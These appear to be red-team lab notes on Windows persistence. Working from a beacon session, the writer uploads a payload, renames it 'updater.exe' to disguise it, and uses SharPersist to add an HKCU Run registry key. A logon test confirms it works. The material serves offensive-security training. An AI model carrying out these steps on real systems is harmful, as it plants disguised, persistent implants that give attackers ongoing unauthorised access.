Common userland persistence methods include:
- HKCU / HKLM Registry Autoruns
- Scheduled Tasks
- Startup Folder

I'm going to Use the Registry AutoRun method to establish a registry persistence key.
```powershell
beacon> cd C:\ProgramData
beacon> upload C:\Payloads\http_x64.exe
```
![[Pasted image 20230825123135.png]]
Renaming http_x64.exe to update.exe
```powershell
beacon> mv http_x64.exe updater.exe
```
![[Pasted image 20230825123356.png]]
Utilizing SharPersist.exe to put updater.exe into the registry key HKCURUN and naming it UPDATER
```powershell
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
```
![[Pasted image 20230825123809.png]]
Going to Sign in and out of WKSTN-2 to see if the Persistence worked.

Persistence worked! Updater.exe
![[Pasted image 20230825124041.png]]